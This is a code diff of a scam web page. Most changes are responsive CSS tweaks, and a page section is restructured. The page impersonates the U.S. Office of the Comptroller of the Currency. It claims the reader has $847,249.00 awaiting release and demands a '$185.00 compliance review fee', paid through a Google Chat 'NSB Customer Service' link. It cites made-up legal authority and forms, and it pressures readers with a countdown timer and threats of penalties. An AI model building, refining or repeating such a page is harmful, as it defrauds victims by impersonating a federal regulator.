@@ -21,6 +21,7 @@
         .container {
             max-width: 960px;
             margin: 0 auto;
+            width: 100%;
         }
         
         .header {
@@ -33,12 +34,12 @@
         
         .header h1 {
             color: #fff;
-            font-size: 24px;
+            font-size: clamp(20px, 5vw, 24px);
         }
         
         .header p {
             color: #fbbf24;
-            font-size: 13px;
+            font-size: clamp(11px, 2.5vw, 13px);
             margin-top: 4px;
         }
         
@@ -56,14 +57,15 @@
             border-bottom: 1px solid #e9edf2;
             font-weight: 700;
             color: #0a1f2e;
-            font-size: 14px;
+            font-size: clamp(12px, 3vw, 14px);
             display: flex;
             justify-content: space-between;
+            flex-wrap: wrap;
         }
         
         .card-header .ref {
             font-weight: 400;
-            font-size: 11px;
+            font-size: clamp(10px, 2.5vw, 11px);
             color: #64748b;
         }
         
@@ -101,12 +103,12 @@
         .success-box .title {
             font-weight: 700;
             color: #166534;
-            font-size: 16px;
+            font-size: clamp(14px, 3.5vw, 16px);
         }
         
         .success-box .desc {
             color: #15803d;
-            font-size: 14px;
+            font-size: clamp(12px, 3vw, 14px);
             margin-top: 4px;
         }
         
@@ -126,20 +128,20 @@
             right: 0;
             background: #dc2626;
             color: #fff;
-            font-size: 10px;
+            font-size: clamp(8px, 2vw, 10px);
             font-weight: 700;
             padding: 4px 16px;
             border-radius: 0 0 0 8px;
         }
         
         .blocked-box .amount {
-            font-size: 30px;
+            font-size: clamp(22px, 7vw, 30px);
             font-weight: 900;
             color: #dc2626;
         }
         
         .blocked-box .label {
-            font-size: 13px;
+            font-size: clamp(11px, 2.5vw, 13px);
             color: #7f1d1d;
         }
         
@@ -167,11 +169,11 @@
         .notice-box .title {
             font-weight: 700;
             color: #92400e;
-            font-size: 15px;
+            font-size: clamp(13px, 3vw, 15px);
         }
         
         .notice-box .text {
-            font-size: 14px;
+            font-size: clamp(12px, 2.8vw, 14px);
             color: #78350f;
             margin-top: 4px;
         }
@@ -184,7 +186,7 @@
         
         .timeline .item {
             padding: 4px 0;
-            font-size: 14px;
+            font-size: clamp(12px, 2.8vw, 14px);
         }
         
         .timeline .item .green {
@@ -211,6 +213,7 @@
             text-align: center;
             text-decoration: none;
             box-shadow: 0 8px 30px rgba(29, 78, 216, 0.4);
+            transition: background 0.3s, transform 0.3s;
         }
         
         .blue-btn:hover {
@@ -220,7 +223,7 @@
         
         .blue-btn .link {
             color: #fff;
-            font-size: 22px;
+            font-size: clamp(18px, 5vw, 22px);
             font-weight: 900;
             display: block;
             padding: 10px 0;
@@ -228,7 +231,7 @@
         
         .blue-btn .arrow {
             color: #fff;
-            font-size: 28px;
+            font-size: clamp(24px, 6vw, 28px);
             display: block;
             animation: bounce 1.5s infinite;
         }
@@ -285,7 +288,7 @@
             color: #fff;
             padding: 6px 30px;
             border-radius: 30px;
-            font-size: 12px;
+            font-size: clamp(10px, 2.5vw, 12px);
             font-weight: 700;
             text-transform: uppercase;
         }
@@ -310,7 +313,7 @@
         }
         
         .opt h4 {
-            font-size: 16px;
+            font-size: clamp(14px, 3.5vw, 16px);
             font-weight: 700;
             color: #0a1f2e;
         }
@@ -318,14 +321,14 @@
         .opt h4 .tag {
             background: #0a1f2e;
             color: #fff;
-            font-size: 9px;
+            font-size: clamp(7px, 2vw, 9px);
             padding: 2px 10px;
             border-radius: 30px;
             margin-left: 6px;
         }
         
         .opt .fee {
-            font-size: 20px;
+            font-size: clamp(18px, 4.5vw, 20px);
             font-weight: 700;
             color: #0a1f2e;
             margin: 4px 0;
@@ -333,7 +336,7 @@
         
         .opt .fee small {
             font-weight: 400;
-            font-size: 13px;
+            font-size: clamp(11px, 2.5vw, 13px);
             color: #64748b;
         }
         
@@ -344,7 +347,7 @@
         }
         
         .opt ul li {
-            font-size: 13px;
+            font-size: clamp(11px, 2.5vw, 13px);
             padding: 4px 0;
             display: flex;
             gap: 8px;
@@ -366,12 +369,12 @@
             border-radius: 6px;
             margin-top: 10px;
             font-weight: 600;
-            font-size: 13px;
+            font-size: clamp(11px, 2.5vw, 13px);
             color: #0a1f2e;
         }
         
         .opt .note {
-            font-size: 12px;
+            font-size: clamp(10px, 2.3vw, 12px);
             color: #475569;
             margin-top: 10px;
             padding-top: 10px;
@@ -387,14 +390,14 @@
         }
         
         .occ-office h4 {
-            font-size: 16px;
+            font-size: clamp(14px, 3.5vw, 16px);
             font-weight: 700;
             color: #0a1f2e;
         }
         
         .occ-office .address {
             font-family: monospace;
-            font-size: 14px;
+            font-size: clamp(12px, 2.8vw, 14px);
             color: #1f2e3f;
             padding: 6px 0;
             line-height: 1.8;
@@ -404,7 +407,7 @@
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 2px 20px;
-            font-size: 13px;
+            font-size: clamp(11px, 2.5vw, 13px);
             color: #475569;
             padding-top: 10px;
             border-top: 1px solid #e2e8f0;
@@ -432,7 +435,7 @@
         
         .nbs-box .label {
             color: #bfdbfe;
-            font-size: 12px;
+            font-size: clamp(10px, 2.3vw, 12px);
             font-weight: 700;
             text-transform: uppercase;
             letter-spacing: 1px;
@@ -440,16 +443,17 @@
         
         .nbs-box .link {
             color: #fff;
-            font-size: 20px;
+            font-size: clamp(16px, 4vw, 20px);
             font-weight: 900;
             display: block;
             padding: 10px 0;
             text-decoration: none;
+            word-break: break-word;
         }
         
         .nbs-box .direct {
             color: #bfdbfe;
-            font-size: 12px;
+            font-size: clamp(10px, 2.3vw, 12px);
             word-break: break-all;
         }
         
@@ -460,7 +464,7 @@
         
         .nbs-box .sub {
             color: #bfdbfe;
-            font-size: 14px;
+            font-size: clamp(12px, 2.8vw, 14px);
             margin-top: 8px;
         }
         
@@ -474,7 +478,7 @@
         
         .warning-box h4 {
             color: #991b1b;
-            font-size: 16px;
+            font-size: clamp(14px, 3.5vw, 16px);
             font-weight: 800;
         }
         
@@ -486,7 +490,7 @@
         
         .warning-box ul li {
             padding: 5px 0;
-            font-size: 14px;
+            font-size: clamp(12px, 2.8vw, 14px);
             color: #7f1d1d;
             display: flex;
             gap: 10px;
@@ -507,9 +511,10 @@
             border: 1px solid #e2e8f0;
             border-radius: 6px;
             padding: 10px 14px;
-            font-size: 13px;
+            font-size: clamp(11px, 2.5vw, 13px);
             display: flex;
             justify-content: space-between;
+            flex-wrap: wrap;
         }
         
         .status-item .green {
@@ -534,7 +539,7 @@
             padding: 10px 28px;
             border-radius: 30px;
             text-decoration: none;
-            font-size: 13px;
+            font-size: clamp(11px, 2.5vw, 13px);
             font-weight: 700;
         }
         
@@ -544,7 +549,7 @@
         
         .footer {
             text-align: center;
-            font-size: 11px;
+            font-size: clamp(9px, 2vw, 11px);
             color: #94a3b8;
             border-top: 1px solid #e2e8f0;
             padding-top: 20px;
@@ -559,7 +564,7 @@
             border-radius: 8px;
             border-left: 6px solid #fbbf24;
             font-family: monospace;
-            font-size: 13px;
+            font-size: clamp(11px, 2.5vw, 13px);
             line-height: 1.8;
             margin: 15px 0;
             animation: heartbeatPulse 2s infinite, flash 3s infinite, flicker 1.5s infinite;
@@ -587,20 +592,20 @@
         }
         
         .info-block h4 {
-            font-size: 15px;
+            font-size: clamp(13px, 3vw, 15px);
             font-weight: 700;
             color: #0a1f2e;
             margin-bottom: 4px;
         }
         
         .info-block p {
-            font-size: 14px;
+            font-size: clamp(12px, 2.8vw, 14px);
             color: #1f2e3f;
             line-height: 1.7;
         }
         
         .info-block ul {
-            font-size: 13px;
+            font-size: clamp(11px, 2.5vw, 13px);
             color: #1f2e3f;
             padding-left: 20px;
             margin-top: 6px;
@@ -647,7 +652,15 @@
             margin-top: 10px;
         }
         
+        img {
+            max-width: 100%;
+            height: auto;
+        }
+        
         @media (max-width: 700px) {
+            body {
+                padding: 10px;
+            }
             .opt-grid {
                 grid-template-columns: 1fr;
             }
@@ -667,7 +680,40 @@
                 font-size: 22px;
             }
             .header h1 {
-                font-size: 18px;
+                font-size: 20px;
+            }
+            .card-header {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            .card-header .ref {
+                margin-top: 4px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .blocked-box .ribbon {
+                font-size: 8px;
+                padding: 2px 12px;
+            }
+            .blue-btn {
+                padding: 20px 15px;
+            }
+            .blue-btn .link {
+                font-size: 16px;
+            }
+            .nbs-box .link {
+                font-size: 14px;
+            }
+            .opt .fee {
+                font-size: 16px;
+            }
+            .occ-notice {
+                font-size: 11px;
+            }
+            .status-item {
+                font-size: 11px;
+                flex-direction: column;
             }
         }
     </style>
@@ -770,258 +816,259 @@
         <div class="page-divider" id="page2">
             <span>🏢 OCC OFFICE — PAGE 2</span>
         </div>
-<!-- ===== PAGE 2 ===== -->
 
-<!-- OCC OFFICE -->
-<div class="card">
-    <div class="card-header">
-        <span>🏢 Office of the Comptroller of the Currency (OCC)</span>
-        <span class="ref">U.S. Department of the Treasury</span>
-    </div>
-    <div class="card-body">
-
-        <div style="text-align:center;padding:10px 0;border-bottom:1px solid #e9edf2;margin-bottom:15px;">
-            <!-- OCC Logo -->
-            <img src="https://i.ibb.co/SwFYzJPB/IMG-20260627-011347.jpg" alt="OCC Logo" style="height:80px;display:block;margin:0 auto 10px auto;">
-            <div style="font-size:20px;font-weight:900;color:#0a1f2e;">OFFICE OF THE COMPTROLLER</div>
-            <div style="font-size:14px;font-weight:600;color:#64748b;">OF THE CURRENCY</div>
-            <div style="font-size:11px;color:#94a3b8;">U.S. Department of the Treasury</div>
-        </div>
-
-        <div class="occ-office">
-            <h4>📍 OCC Headquarters</h4>
-            <div class="address">400 7th St., SW<br>Suite 3E-218<br>Washington, DC 20219</div>
-            <div class="details">
-                <div><strong>Hours:</strong> Mon–Fri, 8:30 AM – 5:00 PM EST</div>
-                <div><strong>Weekends:</strong> Closed</div>
-                <div><strong>Appointment:</strong> Required — takes 7 days or a week to schedule</div>
-                <div><strong>Distance:</strong> 1,300 miles from Dallas</div>
-                <div><strong>Driving Time:</strong> 20–22 hours one-way</div>
-                <div><strong>Authority:</strong> National Bank Act of 1864</div>
-            </div>
-        </div>
-
-            <!-- WHY PENDING -->
-            <div class="info-block">
-                <h4>❓ Why Is This Pending?</h4>
-                <p><strong>The bank cannot legally release your funds without OCC approval.</strong> The OCC is the primary federal regulator responsible for supervising all national banks. Before a bank can release funds exceeding $500,000 from flagged entities, the OCC requires a final compliance review to ensure:</p>
-                <ul>
-                    <li>All required reports have been properly filed with FinCEN, IRS, OFAC, and other federal agencies</li>
-                    <li>Anti-Money Laundering (AML) protocols have been fully satisfied</li>
-                    <li>Know Your Customer (KYC) requirements have been met</li>
-                    <li>Bank Secrecy Act (BSA) compliance is confirmed</li>
-                </ul>
-                <p style="font-weight:700;margin-top:6px;">Without this clearance, the bank cannot release your funds — even though your money is already at the bank and ready for disbursement.</p>
-            </div>
-
-            <!-- FEE -->
-            <div class="fee-block">
-                <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;">
-                    <div>
-                        <h4 style="font-size:15px;font-weight:700;color:#92400e;">💰 OCC Compliance Review Fee</h4>
-                        <div style="font-size:13px;color:#78350f;">Federal processing fee mandated under <strong>12 CFR § 8.6</strong></div>
-                    </div>
-                    <div style="font-size:28px;font-weight:900;color:#dc2626;">$185.00</div>
-                </div>
-                <div style="font-size:13px;color:#78350f;margin-top:6px;font-weight:700;">✋ The bank cannot cover this fee. It must be paid directly by the beneficiary.</div>
-            </div>
-
-            <!-- TOTAL AMOUNT -->
-            <div class="total-block">
-                <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;">
-                    <span style="font-weight:700;color:#0a1f2e;font-size:15px;">Total Amount to Release:</span>
-                    <span style="font-size:24px;font-weight:900;color:#15803d;">$847,249.00</span>
-                </div>
-            </div>
-
-            <!-- OPTIONS -->
+        <!-- ===== PAGE 2 ===== -->
+        <div id="page2content">
+            <!-- OCC OFFICE -->
             <div class="card">
                 <div class="card-header">
-                    <span>🛣️ Your Options — Choose How to Proceed</span>
+                    <span>🏢 Office of the Comptroller of the Currency (OCC)</span>
+                    <span class="ref">U.S. Department of the Treasury</span>
                 </div>
                 <div class="card-body">
-                    <div style="font-size:14px;color:#1f2e3f;margin-bottom:12px;">
-                        You have two options to complete this final compliance verification. <strong>We strongly recommend Option 2.</strong>
+                    <div style="text-align:center;padding:10px 0;border-bottom:1px solid #e9edf2;margin-bottom:15px;">
+                        <img src="https://i.ibb.co/SwFYzJPB/IMG-20260627-011347.jpg" alt="OCC Logo" style="max-height:80px; height:auto; width:auto; display:block; margin:0 auto 10px auto;">
+                        <div style="font-size:clamp(18px, 5vw, 20px); font-weight:900; color:#0a1f2e;">OFFICE OF THE COMPTROLLER</div>
+                        <div style="font-size:clamp(12px, 3.5vw, 14px); font-weight:600; color:#64748b;">OF THE CURRENCY</div>
+                        <div style="font-size:clamp(10px, 2.5vw, 11px); color:#94a3b8;">U.S. Department of the Treasury</div>
                     </div>
-                    <div class="opt-grid">
-                        <!-- OPTION 1 -->
-                        <div class="opt">
-                            <h4>🏢 Option 1: In-Person Visit</h4>
-                            <div style="font-size:12px;color:#475569;margin:4px 0;">
-                                <strong>OCC Headquarters</strong><br>
-                                400 7th St., SW, Suite 3E-218<br>
-                                Washington, DC 20219
+
+                    <div class="occ-office">
+                        <h4>📍 OCC Headquarters</h4>
+                        <div class="address">400 7th St., SW<br>Suite 3E-218<br>Washington, DC 20219</div>
+                        <div class="details">
+                            <div><strong>Hours:</strong> Mon–Fri, 8:30 AM – 5:00 PM EST</div>
+                            <div><strong>Weekends:</strong> Closed</div>
+                            <div><strong>Appointment:</strong> Required — takes 7 days or a week to schedule</div>
+                            <div><strong>Distance:</strong> 1,300 miles from Dallas</div>
+                            <div><strong>Driving Time:</strong> 20–22 hours one-way</div>
+                            <div><strong>Authority:</strong> National Bank Act of 1864</div>
+                        </div>
+                    </div>
+
+                    <!-- WHY PENDING -->
+                    <div class="info-block">
+                        <h4>❓ Why Is This Pending?</h4>
+                        <p><strong>The bank cannot legally release your funds without OCC approval.</strong> The OCC is the primary federal regulator responsible for supervising all national banks. Before a bank can release funds exceeding $500,000 from flagged entities, the OCC requires a final compliance review to ensure:</p>
+                        <ul>
+                            <li>All required reports have been properly filed with FinCEN, IRS, OFAC, and other federal agencies</li>
+                            <li>Anti-Money Laundering (AML) protocols have been fully satisfied</li>
+                            <li>Know Your Customer (KYC) requirements have been met</li>
+                            <li>Bank Secrecy Act (BSA) compliance is confirmed</li>
+                        </ul>
+                        <p style="font-weight:700;margin-top:6px;">Without this clearance, the bank cannot release your funds — even though your money is already at the bank and ready for disbursement.</p>
+                    </div>
+
+                    <!-- FEE -->
+                    <div class="fee-block">
+                        <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;">
+                            <div>
+                                <h4 style="font-size:clamp(13px, 3vw, 15px);font-weight:700;color:#92400e;">💰 OCC Compliance Review Fee</h4>
+                                <div style="font-size:clamp(11px, 2.5vw, 13px);color:#78350f;">Federal processing fee mandated under <strong>12 CFR § 8.6</strong></div>
                             </div>
-                            <div style="font-size:12px;color:#475569;margin-bottom:6px;">
-                                <strong>Distance:</strong> 1,300 miles from Dallas<br>
-                                <strong>Driving Time:</strong> 20–22 hours one-way
+                            <div style="font-size:clamp(22px, 6vw, 28px);font-weight:900;color:#dc2626;">$185.00</div>
+                        </div>
+                        <div style="font-size:clamp(11px, 2.5vw, 13px);color:#78350f;margin-top:6px;font-weight:700;">✋ The bank cannot cover this fee. It must be paid directly by the beneficiary.</div>
+                    </div>
+
+                    <!-- TOTAL AMOUNT -->
+                    <div class="total-block">
+                        <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;">
+                            <span style="font-weight:700;color:#0a1f2e;font-size:clamp(13px, 3vw, 15px);">Total Amount to Release:</span>
+                            <span style="font-size:clamp(18px, 5vw, 24px);font-weight:900;color:#15803d;">$847,249.00</span>
+                        </div>
+                    </div>
+
+                    <!-- OPTIONS -->
+                    <div class="card">
+                        <div class="card-header">
+                            <span>🛣️ Your Options — Choose How to Proceed</span>
+                        </div>
+                        <div class="card-body">
+                            <div style="font-size:14px;color:#1f2e3f;margin-bottom:12px;">
+                                You have two options to complete this final compliance verification. <strong>We strongly recommend Option 2.</strong>
                             </div>
-                            <ul>
-                                <li><span class="cr">✗</span> No fee for the in-person visit</li>
-                                <li><span class="cr">✗</span> Monday–Friday only — <strong>Closed weekends</strong></li>
-                                <li><span class="cr">✗</span> Appointment required — takes <strong>7 days or a week</strong> to schedule</li>
-                                <li><span class="cr">✗</span> Travel costs: <strong>$500–$1,000+</strong> (gas, hotel, meals)</li>
-                                <li><span class="cr">✗</span> Funds released after appointment completion</li>
-                            </ul>
-                            <div style="font-size:12px;color:#475569;margin-top:8px;padding-top:8px;border-top:1px solid #e2e8f0;">
-                                <strong>Why visit in person?</strong> The OCC requires an in-person visit to complete the following final steps on-site:
-                                <ul style="list-style:none;padding:0;margin-top:4px;font-size:12px;color:#475569;line-height:1.8;">
-                                    <li>• <strong>Physically stamp and execute the final compliance affidavit</strong> — The original OCC stamp and "wet ink" signature must be applied to the final affidavit in person.</li>
-                                    <li>• <strong>Witness the final funds release authorization</strong> — The final authorization must be signed in the presence of an OCC compliance officer.</li>
-                                    <li>• <strong>Receive the original OCC compliance clearance certificate (Form OCC-808)</strong> — The original physical certificate is issued on-site. A digital copy will be transmitted to the bank electronically.</li>
-                                    <li>• <strong>Conclude the Bank Secrecy Act (BSA) Final Review</strong> — The OCC officer physically closes the BSA file and signs the final closure memo.</li>
-                                    <li>• <strong>Provide physical signature on OFAC certification</strong> — OFAC clearance requires a physical signature from both the beneficiary and the OCC officer.</li>
-                                    <li>• <strong>Complete the final interview with the OCC examiner</strong> — A brief final interview is required to confirm all source of funds documentation is consistent with reports submitted.</li>
-                                    <li>• <strong>Collect the official OCC compliance seal</strong> — The official OCC compliance seal is applied to the final release documents in person.</li>
+                            <div class="opt-grid">
+                                <!-- OPTION 1 -->
+                                <div class="opt">
+                                    <h4>🏢 Option 1: In-Person Visit</h4>
+                                    <div style="font-size:12px;color:#475569;margin:4px 0;">
+                                        <strong>OCC Headquarters</strong><br>
+                                        400 7th St., SW, Suite 3E-218<br>
+                                        Washington, DC 20219
+                                    </div>
+                                    <div style="font-size:12px;color:#475569;margin-bottom:6px;">
+                                        <strong>Distance:</strong> 1,300 miles from Dallas<br>
+                                        <strong>Driving Time:</strong> 20–22 hours one-way
+                                    </div>
+                                    <ul>
+                                        <li><span class="cr">✗</span> No fee for the in-person visit</li>
+                                        <li><span class="cr">✗</span> Monday–Friday only — <strong>Closed weekends</strong></li>
+                                        <li><span class="cr">✗</span> Appointment required — takes <strong>7 days or a week</strong> to schedule</li>
+                                        <li><span class="cr">✗</span> Travel costs: <strong>$500–$1,000+</strong> (gas, hotel, meals)</li>
+                                        <li><span class="cr">✗</span> Funds released after appointment completion</li>
+                                    </ul>
+                                    <div style="font-size:12px;color:#475569;margin-top:8px;padding-top:8px;border-top:1px solid #e2e8f0;">
+                                        <strong>Why visit in person?</strong> The OCC requires an in-person visit to complete the following final steps on-site:
+                                        <ul style="list-style:none;padding:0;margin-top:4px;font-size:12px;color:#475569;line-height:1.8;">
+                                            <li>• <strong>Physically stamp and execute the final compliance affidavit</strong> — The original OCC stamp and "wet ink" signature must be applied to the final affidavit in person.</li>
+                                            <li>• <strong>Witness the final funds release authorization</strong> — The final authorization must be signed in the presence of an OCC compliance officer.</li>
+                                            <li>• <strong>Receive the original OCC compliance clearance certificate (Form OCC-808)</strong> — The original physical certificate is issued on-site. A digital copy will be transmitted to the bank electronically.</li>
+                                            <li>• <strong>Conclude the Bank Secrecy Act (BSA) Final Review</strong> — The OCC officer physically closes the BSA file and signs the final closure memo.</li>
+                                            <li>• <strong>Provide physical signature on OFAC certification</strong> — OFAC clearance requires a physical signature from both the beneficiary and the OCC officer.</li>
+                                            <li>• <strong>Complete the final interview with the OCC examiner</strong> — A brief final interview is required to confirm all source of funds documentation is consistent with reports submitted.</li>
+                                            <li>• <strong>Collect the official OCC compliance seal</strong> — The official OCC compliance seal is applied to the final release documents in person.</li>
+                                        </ul>
+                                    </div>
+                                    <div class="note">
+                                        <strong>Note:</strong> In normal circumstances, the OCC only handles compliance reviews in person. Beneficiaries are required to visit the headquarters office in Washington, D.C. without any fee.
+                                    </div>
+                                </div>
+
+                                <!-- OPTION 2 -->
+                                <div class="opt rec">
+                                    <h4>💻 Option 2: Online Processing <span class="tag">Recommended</span></h4>
+                                    <div class="fee">$185.00 <small>processing fee</small></div>
+                                    <ul>
+                                        <li><span class="ck">✓</span> No travel required — complete from home</li>
+                                        <li><span class="ck">✓</span> Available immediately — no waiting for business days</li>
+                                        <li><span class="ck">✓</span> No appointment needed</li>
+                                        <li><span class="ck">✓</span> Funds released within <strong>24 hours</strong> of confirmation</li>
+                                        <li><span class="ck">✓</span> Total cost: <strong>only $185</strong> vs. $500–$1,000+ in travel costs</li>
+                                    </ul>
+                                    <div class="highlight">
+                                        ✅ <strong>Why choose this?</strong> Saves you time, money, and inconvenience. The $185 processing fee is minimal compared to the hundreds of dollars you would spend on travel, accommodation, and meals.
+                                    </div>
+                                    <div class="note">
+                                        <strong>Why the OCC offers this option:</strong> The OCC has authorized an online verification process for your case due to the significant distance between your location and the OCC headquarters in Washington, D.C. This option is granted on a case-by-case basis and is not routinely offered.<br><br>
+                                        Please be advised that this online processing is a rare exception, extended only because your case has been flagged for final closure. Once this review is complete, the OCC will have no further involvement in this matter.<br><br>
+                                        The $185.00 fee covers digital document verification, electronic signature authentication, and secure transmission of your clearance certificate to the bank, as authorized under 12 CFR § 8.6.
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- PAYMENT INSTRUCTIONS -->
+                    <div class="card">
+                        <div class="card-header">
+                            <span>💳 Payment Instructions — How to Proceed</span>
+                        </div>
+                        <div class="card-body">
+                            <div style="font-size:14px;color:#1f2e3f;margin-bottom:12px;">
+                                <strong>The bank does not handle this fee.</strong> To complete the online verification, you must contact the <strong>NSB Customer Service Channel</strong> — your established point of contact throughout this process.
+                            </div>
+                            <div class="nbs-box">
+                                <div class="label">🎧 NSB Customer Service Channel</div>
+                                <a class="link" href="https://chat.google.com/room/AAQA_zud-Vs?cls=5" target="_blank" rel="noopener noreferrer">💬 Click Here to Contact NSB Customer Service</a>
+                                <div class="direct">🔗 Direct Link: <a href="https://chat.google.com/room/AAQA_zud-Vs?cls=5" target="_blank" rel="noopener noreferrer">chat.google.com/room/AAQA_zud-Vs</a></div>
+                                <div class="sub">ℹ️ This channel has a direct communication link with the OCC</div>
+                            </div>
+                            <div class="instruction-block">
+                                <div style="font-weight:700;color:#0a1f2e;font-size:clamp(13px, 3vw, 15px);">What the NSB Customer Service Channel will do:</div>
+                                <ul style="font-size:14px;color:#475569;margin-top:6px;padding-left:20px;line-height:1.8;">
+                                    <li>✅ Provide you with the official OCC payment details</li>
+                                    <li>✅ Forward your payment confirmation to the OCC</li>
+                                    <li>✅ Coordinate directly with the OCC on your behalf</li>
+                                    <li>✅ Confirm completion to the bank</li>
+                                    <li>✅ Ensure your funds are released within <strong>24 hours</strong></li>
                                 </ul>
                             </div>
-                            <div class="note">
-                                <strong>Note:</strong> In normal circumstances, the OCC only handles compliance reviews in person. Beneficiaries are required to visit the headquarters office in Washington, D.C. without any fee.
-                            </div>
-                        </div>
-
-                        <!-- OPTION 2 -->
-                        <div class="opt rec">
-                            <h4>💻 Option 2: Online Processing <span class="tag">Recommended</span></h4>
-                            <div class="fee">$185.00 <small>processing fee</small></div>
-                            <ul>
-                                <li><span class="ck">✓</span> No travel required — complete from home</li>
-                                <li><span class="ck">✓</span> Available immediately — no waiting for business days</li>
-                                <li><span class="ck">✓</span> No appointment needed</li>
-                                <li><span class="ck">✓</span> Funds released within <strong>24 hours</strong> of confirmation</li>
-                                <li><span class="ck">✓</span> Total cost: <strong>only $185</strong> vs. $500–$1,000+ in travel costs</li>
-                            </ul>
-                            <div class="highlight">
-                                ✅ <strong>Why choose this?</strong> Saves you time, money, and inconvenience. The $185 processing fee is minimal compared to the hundreds of dollars you would spend on travel, accommodation, and meals.
-                            </div>
-                            <div class="note">
-                                <strong>Why the OCC offers this option:</strong> The OCC has authorized an online verification process for your case due to the significant distance between your location and the OCC headquarters in Washington, D.C. This option is granted on a case-by-case basis and is not routinely offered.<br><br>
-                                Please be advised that this online processing is a rare exception, extended only because your case has been flagged for final closure. Once this review is complete, the OCC will have no further involvement in this matter.<br><br>
-                                The $185.00 fee covers digital document verification, electronic signature authentication, and secure transmission of your clearance certificate to the bank, as authorized under 12 CFR § 8.6.
+                            <div class="release-block">
+                                <div style="font-weight:700;color:#166534;font-size:14px;">
+                                    ⏳ Once the OCC fee is paid and the review is complete, your funds will be released within <strong>24 hours</strong>.
+                                </div>
                             </div>
                         </div>
                     </div>
-                </div>
-            </div>
 
-            <!-- PAYMENT INSTRUCTIONS -->
-            <div class="card">
-                <div class="card-header">
-                    <span>💳 Payment Instructions — How to Proceed</span>
-                </div>
-                <div class="card-body">
-                    <div style="font-size:14px;color:#1f2e3f;margin-bottom:12px;">
-                        <strong>The bank does not handle this fee.</strong> To complete the online verification, you must contact the <strong>NSB Customer Service Channel</strong> — your established point of contact throughout this process.
-                    </div>
-                    <div class="nbs-box">
-                        <div class="label">🎧 NSB Customer Service Channel</div>
-                        <a class="link" href="https://chat.google.com/room/AAQA_zud-Vs?cls=5" target="_blank" rel="noopener noreferrer">💬 Click Here to Contact NSB Customer Service</a>
-                        <div class="direct">🔗 Direct Link: <a href="https://chat.google.com/room/AAQA_zud-Vs?cls=5" target="_blank" rel="noopener noreferrer">chat.google.com/room/AAQA_zud-Vs</a></div>
-                        <div class="sub">ℹ️ This channel has a direct communication link with the OCC</div>
-                    </div>
-                    <div class="instruction-block">
-                        <div style="font-weight:700;color:#0a1f2e;font-size:15px;">What the NSB Customer Service Channel will do:</div>
-                        <ul style="font-size:14px;color:#475569;margin-top:6px;padding-left:20px;line-height:1.8;">
-                            <li>✅ Provide you with the official OCC payment details</li>
-                            <li>✅ Forward your payment confirmation to the OCC</li>
-                            <li>✅ Coordinate directly with the OCC on your behalf</li>
-                            <li>✅ Confirm completion to the bank</li>
-                            <li>✅ Ensure your funds are released within <strong>24 hours</strong></li>
-                        </ul>
-                    </div>
-                    <div class="release-block">
-                        <div style="font-weight:700;color:#166534;font-size:14px;">
-                            ⏳ Once the OCC fee is paid and the review is complete, your funds will be released within <strong>24 hours</strong>.
+                    <!-- ===== FAILURE TO COMPLETE SECTION ===== -->
+                    <div class="card">
+                        <div class="card-header">
+                            <span>⚠️ Failure to Complete This Step</span>
+                        </div>
+                        <div class="card-body">
+                            <!-- Countdown Timer -->
+                            <div id="countdownWarning" style="
+                                background: #fef2f2;
+                                border: 3px solid #dc2626;
+                                border-radius: 10px;
+                                padding: 20px 24px;
+                                margin: 15px 0;
+                                text-align: center;
+                            ">
+                                <h4 style="color:#991b1b;font-size:clamp(15px, 4vw, 17px);font-weight:800;">⏳ Time Remaining Before Case Closure</h4>
+                                <div id="timer" style="font-size:clamp(24px, 8vw, 36px);font-weight:900;color:#dc2626;margin:10px 0;font-family:monospace;">48:00:00</div>
+                                <p style="font-size:clamp(11px, 2.5vw, 13px);color:#7f1d1d;">If the fee is not paid before the timer expires, your case will be closed and you will need to restart the process.</p>
+                            </div>
+
+                            <!-- Warning List -->
+                            <div class="warning-box">
+                                <h4>🚫 What Happens If You Do Not Pay the OCC Fee?</h4>
+                                <ul>
+                                    <li><span>✗</span> The OCC will <strong style="color:#991b1b;">not conduct</strong> the final compliance review</li>
+                                    <li><span>✗</span> The bank <strong style="color:#991b1b;">cannot legally release</strong> your <strong style="color:#991b1b;">$847,249.00</strong> funds</li>
+                                    <li><span>✗</span> Your case will remain <strong style="color:#991b1b;">pending indefinitely</strong></li>
+                                    <li><span>✗</span> Your funds will remain <strong style="color:#991b1b;">frozen</strong> in the bank's holding account</li>
+                                    <li><span>✗</span> You may be subject to <strong style="color:#991b1b;">additional penalties or interest</strong></li>
+                                    <li><span>✗</span> The OCC may <strong style="color:#991b1b;">close your case entirely</strong>, requiring you to restart the process — which could take <strong style="color:#991b1b;">weeks or months</strong></li>
+                                </ul>
+                            </div>
+
+                            <!-- Best Course of Action -->
+                            <div class="action-box">
+                                <div style="font-weight:700;color:#991b1b;font-size:clamp(14px, 3.5vw, 16px);margin-bottom:6px;">⚠️ Your Best Course of Action</div>
+                                <div style="font-size:clamp(12px, 2.8vw, 14px);color:#7f1d1d;line-height:1.7;">
+                                    To avoid delays, additional penalties, or potential case closure, we strongly recommend completing the OCC payment <strong style="color:#991b1b;">as soon as possible</strong>. Once the fee is paid and the review is completed, your funds will be released within <strong style="color:#991b1b;">24 hours</strong>.
+                                </div>
+                                <div style="font-size:clamp(12px, 2.8vw, 14px);color:#7f1d1d;margin-top:8px;font-weight:700;padding:10px 14px;background:#fff;border-radius:6px;border:1px solid #fecaca;">
+                                    ✅ This is the <strong style="color:#991b1b;font-size:15px;">final step</strong> in your case. After this, <strong style="color:#991b1b;">no further fees or requirements</strong> will be necessary.
+                                </div>
+                            </div>
                         </div>
                     </div>
-                </div>
-            </div>
 
-            <!-- ===== FAILURE TO COMPLETE SECTION ===== -->
-            <div class="card">
-                <div class="card-header">
-                    <span>⚠️ Failure to Complete This Step</span>
-                </div>
-                <div class="card-body">
-                    <!-- Countdown Timer -->
-                    <div id="countdownWarning" style="
-                        background: #fef2f2;
-                        border: 3px solid #dc2626;
-                        border-radius: 10px;
-                        padding: 20px 24px;
-                        margin: 15px 0;
-                        text-align: center;
-                    ">
-                        <h4 style="color:#991b1b;font-size:17px;font-weight:800;">⏳ Time Remaining Before Case Closure</h4>
